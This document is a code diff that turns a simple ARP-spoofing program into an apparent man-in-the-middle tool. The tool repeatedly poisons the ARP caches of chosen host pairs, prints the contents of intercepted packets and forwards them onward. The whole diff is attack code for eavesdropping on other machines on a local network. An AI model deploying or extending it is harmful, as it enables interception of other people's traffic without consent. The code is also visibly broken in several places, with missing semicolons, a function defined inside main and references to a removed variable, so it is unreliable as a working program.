@@ -11,6 +11,11 @@
 #include <netinet/in.h>
 #include <cstring>
 #include <vector>
+#include <thread>
+#include <time.h>
+#include <utility>
+
+#define TIMEOUT_MILLI (3000)
 
 using namespace std;
 
@@ -21,11 +26,25 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-char* device;
-Mac   localMac;
-Ip    localIp;
+char*        device;
+Mac          localMac;
+Ip           localIp;
+map<Ip, Mac> dataMap;
+map<Mac, Ip> dataMapReverse;
+vector<Ip>   tarIp1, tarIp2;
+vector<Mac>  tarMac1, tarMac2;
 
-void getLocal() {
+void mySleep(int milliSecond) {
+    clock_t startClk = clock();
+
+    milliSecond--;
+    while (1) {
+        if ((clock() - startClk) > milliSecond) break;
+    }
+}
+
+
+void getLocalIp() {
     struct ifaddrs *ifaddr, *ifa;
     char ip[100];
 
@@ -79,8 +98,8 @@ void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, uint16_t mode){ // mode: ArpHdr
     packet.eth_.smac_ = smac;
     packet.eth_.type_ = htons(EthHdr::Arp);
 
-    if(dmac == Mac("ff:ff:ff:ff:ff:ff")){
-        dmac = Mac("00:00:00:00:00:00");
+    if(dmac.isBroadcast()){
+        dmac = Mac::nullMac();
     }
 
     packet.arp_.hrd_  = htons(ArpHdr::ETHER);
@@ -94,6 +113,33 @@ void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, uint16_t mode){ // mode: ArpHdr
     packet.arp_.tip_  = htonl(tip);
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+
+    pcap_close(handle);
+}
+
+void sendPacket(EthHdr eth, const u_char* data, uint32_t start, uint32_t end){
+    char    packet[1501] = {}
+    char    errbuf[PCAP_ERRBUF_SIZE];
+    EthHdr* ethhdr = (EthHdr*) packet;
+    pcap_t* handle = pcap_open_live(device, 0, 0, 0, errbuf);
+
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
+        exit(-1);
+    }
+    
+    ethhdr->dmac_  = eth.dmac_;
+    ethhdr->smac_  = eth.smac_;
+    ethhdr->type_  = eth.type_;
+
+    for(int i = 0; i<end-start; i++){
+        packet[i+sizeof(EthHdr)] = data[i+start];
+    }
+
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), end-start);
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
@@ -120,10 +166,6 @@ void getLocalMac(){
     fclose(fp);
 }
 
-map<Ip, int> dataMap;
-int          cnts = 0;
-vector<Mac>  macs = {};
-
 void getMacFromArp(Ip tip, Ip usingip){
     if(dataMap.find(tip) != dataMap.end()) return;
 
@@ -131,7 +173,7 @@ void getMacFromArp(Ip tip, Ip usingip){
     pcap_pkthdr*  temp;
     char          errbuf[PCAP_ERRBUF_SIZE];
 
-    sendArp(localMac, Mac("ff:ff:ff:ff:ff:ff"), usingip, tip, ArpHdr::Request);
+    sendArp(localMac, Mac::broadcastMac(), usingip, tip, ArpHdr::Request);
 
     pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
@@ -139,7 +181,13 @@ void getMacFromArp(Ip tip, Ip usingip){
         exit(-1);
     }
 
+    clock_t startClk = clock();
     while(1){
+        if ((clock() - startClk) > TIMEOUT_MILLI){
+            sendArp(localMac, Mac::broadcastMac(), usingip, tip, ArpHdr::Request);
+            startClk = clock();
+        }
+
         int res = pcap_next_ex(handle, &temp, &data);
         if(res==0) continue;
         if(res==-1 || res==-2){
@@ -149,23 +197,108 @@ void getMacFromArp(Ip tip, Ip usingip){
 
         EthArpPacket* packetPtr = (EthArpPacket*)data;
 
-        if(packetPtr->eth_.type_ != htons(EthHdr::Arp)) continue;
-        if(packetPtr->arp_.sip_  != htonl(tip))         continue;
+        if(packetPtr->eth_.type_ != htons(EthHdr::Arp))     continue;
+        if(packetPtr->arp_.op_   != htons(ArpHdr::Reply))   continue;
+        if(packetPtr->arp_.sip_  != htonl(tip))             continue;
 
-        macs.push_back(packetPtr->arp_.smac());
-
-        dataMap.insert( { Ip(ntohl(packetPtr->arp_.sip_)), cnts++ } );
+        dataMap.insert( { Ip(ntohl(packetPtr->arp_.sip_)), Mac(packetPtr->arp_.smac()) } );
+        dataMapReverse.insert( { Mac(packetPtr->arp_.smac()), Ip(ntohl(packetPtr->arp_.sip_)) } );
         break;
     }
     pcap_close(handle);
 }
 
-void goArpAttack(Ip sip, Ip tip){
-    getMacFromArp(sip, localIp);
+void sendArpAttack(Ip sip, Ip tip) {
+    for(int i=0;i<3;i++)
+        sendArp(localMac, macs[dataMap[sip]], tip, sip, ArpHdr::Reply);
+}
 
-    Mac smac = macs[dataMap[sip]];
+int checkInList(Ip sip, Ip tip) {
+    for(int i=0; i<tarIp1.size(); i++){
+        if(tarIp1[i] == sip && tarIp2[i] == tip){
+            return i;
+        }
+    }
+    return -1;
+}
 
-    for(int i=0;i<5;i++) sendArp(localMac, smac, tip, sip, ArpHdr::Reply);
+int checkInListMac(Mac src){
+    for(int i=0; i<tarMac1.size(); i++){
+        if(tarMac1[i] == src) return i;
+    }
+    return -1;
+}
+
+void searchNetwork() {
+    const u_char* data;
+    pcap_pkthdr*  header;
+    char          errbuf[PCAP_ERRBUF_SIZE];
+
+    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
+        exit(-1);
+    }
+
+    int res = pcap_next_ex(handle, &header, &data);
+    if(res==0) continue;
+    if(res==-1 || res==-2){
+        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+        exit(0);
+    }
+
+    pcap_close(handle);
+    EthArpPacket* packetPtr = (EthArpPacket*)data;
+
+    if(packetPtr->eth_.type_ == htons(EthHdr::Arp)) {
+        Ip sip = ntohl(packetPtr->arp_.sip_);
+        Ip tip = ntohl(packetPtr->arp_.tip_);
+        
+        if(checkInList(sip, tip) != -1){
+            sendArpAttack(sip, tip);
+        }
+        swap(sip, tip);
+
+        if(checkInList(sip, tip) != -1){
+            sendArpAttack(sip, tip);
+        }
+    }
+    else {
+        EthHdr* packetPtr = (EthHdr*)data;
+        if(packetPtr->dmac_ != localMac) continue;
+        int idx = checkInListMac(packetPtr->smac_);
+        if(idx == -1) return;
+
+        packetPtr->dmac_ = tarMac2[idx];
+        
+        string sip = (string)dataMapReverse[packetPtr->smac_];
+        string dip = (string)dataMapReverse[packetPtr->dmac_];
+
+        printf("%d.%d.%d.%d to %d.%d.%d.%d : \n", sip[0], sip[1], sip[2], sip[3], dip[0], dip[1], dip[2], dip[3]);
+        for(uint32_t i=sizeof(EthHdr); i<(header->len); i++){
+            printf("%c", data[i]);
+        }
+
+        printf("\n------------------------------------\n");
+
+        for(uint32_t i=sizeof(EthHdr); i<(header->len); i+= 1500-sizeof(EthHdr)){
+            sendPacket(*packetPtr, data, i, max(header->len, i+1500-sizeof(EthHdr)));
+        }
+    }
+}
+
+void attackArpAll() {
+    for(int i=0; i<tarIp1.size(); i++) {
+        for(int i=0;i<3;i++)
+            sendArpAttack(tarIp1[i], tarIp2[i]);
+    }
+}
+
+void attackArpAllProc() {
+    while (true) {
+        mySleep(10000);
+        attackArpAll();
+    }
 }
 
 int main(int argc, char* argv[]) {
@@ -176,13 +309,34 @@ int main(int argc, char* argv[]) {
     device = argv[1];
 
     getLocalMac();
-    getLocal();
+    getLocalIp();
 
-    for(int i=2; i<argc; i+=2){
-        printf("processing %s to %s\n", argv[i], argv[i+1]);
-        goArpAttack(Ip(argv[i]), Ip(argv[i+1]));
-        printf("success!\n");
+    for(int i=2; i<argc; i+=2) {
+        tarIp1.push_back(Ip(argv[i]))
+        tarIp2.push_back(Ip(argv[i+1]))
     }
+
+    printf("[DEBUG] Processing ARP Attack\n");
+    
+    void attackArpAll() {
+        for(int i=0; i<tarIp1.size(); i++) {
+            getMacFromArp(tarIp1[i], localIp);
+            getMacFromArp(tarIp2[i], localIp);
+
+            tarMac1.push_back(dataMap[tarIp1[i]]);
+            tarMac2.push_back(dataMap[tarIp2[i]]);
+            
+            for(int i=0;i<3;i++)
+                sendArpAttack(tarIp1[i], tarIp2[i]);
+        }
+    }
+    thread arp(attackArpAllProc);
+    
+    printf("[DEBUG] Processing Getting Packet\n");
+    while (true) {
+        searchNetwork();
+    }
+    
     
     return 0;
 }
